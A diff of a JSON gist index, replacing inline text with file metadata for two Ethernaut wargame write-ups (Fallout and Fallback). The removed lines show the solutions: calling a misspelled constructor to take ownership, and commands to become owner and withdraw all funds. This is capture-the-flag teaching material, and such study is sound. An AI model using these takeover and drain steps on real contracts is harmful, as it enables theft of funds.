@@ -1,14 +1,48 @@
 [
     {
+        "key": 1,
+        "api_url": "https://api.github.com/gists/4088356e12bd482146a1afadbe99c4e0",
         "html_url": "https://gist.github.com/trmchale1/4088356e12bd482146a1afadbe99c4e0",
-        "timestamp": "2024-02-21T16:33:32Z",
+        "created_at": "2024-02-21T16:33:32Z",
         "description": "Smart Contract Audit Ethernaut: Fallout",
-        "content": "The constructor has incorrect syntax and is misspelled, you can call it as a function and change the ownership of the contract:\n\n``` contract.Fal1out() ```"
+        "files": [
+            {
+                "filename": "Fallout.md",
+                "type": "text/markdown",
+                "language": "Markdown",
+                "raw_url": "https://gist.githubusercontent.com/trmchale1/4088356e12bd482146a1afadbe99c4e0/raw/c9c23b00305c695c92246bc49e22e0c7afd7c4d9/Fallout.md",
+                "size": 155
+            },
+            {
+                "filename": "Fallout.sol",
+                "type": "text/plain",
+                "language": "Solidity",
+                "raw_url": "https://gist.githubusercontent.com/trmchale1/4088356e12bd482146a1afadbe99c4e0/raw/24f875e437763fcd91acd1dc2ff16104d808d25f/Fallout.sol",
+                "size": 998
+            }
+        ]
     },
     {
+        "key": 2,
+        "api_url": "https://api.github.com/gists/95b69f2fae637f6511b9818aa007d5b0",
         "html_url": "https://gist.github.com/trmchale1/95b69f2fae637f6511b9818aa007d5b0",
-        "timestamp": "2024-02-20T01:27:08Z",
+        "created_at": "2024-02-20T01:27:08Z",
         "description": "Smart Contract Audit Ethernaut: Fallback",
-        "content": "Smart Contract Audit Ethernaut: Fallback\n\nIn this game the player must become the owner, then withdraw the full amount from the contract.\n\nThe key part is the receive() function, if the contract recieves a value greater than 0 and contributions of the sender are also greater than zero, then the sender becomes the owner.\n\nWe send some small sum to the player:\n\n``` await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')}) ```\n\nWe send a small sum to the contract:\n\n``` await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) ```\n\nCheck we own the contract:\n\n``` await contract.owner() ```\n\nThen withdraw the loot:\n\n``` await contract.withdraw() ```"
+        "files": [
+            {
+                "filename": "Fallback.sol",
+                "type": "text/plain",
+                "language": "Solidity",
+                "raw_url": "https://gist.githubusercontent.com/trmchale1/95b69f2fae637f6511b9818aa007d5b0/raw/8c5cc076bcedd9eb0613d09611eb051062813b07/Fallback.sol",
+                "size": 928
+            },
+            {
+                "filename": "fallback.md",
+                "type": "text/markdown",
+                "language": "Markdown",
+                "raw_url": "https://gist.githubusercontent.com/trmchale1/95b69f2fae637f6511b9818aa007d5b0/raw/932fe03455de1bcb4f6cd33d843e2d3755fc03a3/fallback.md",
+                "size": 705
+            }
+        ]
     }
 ]
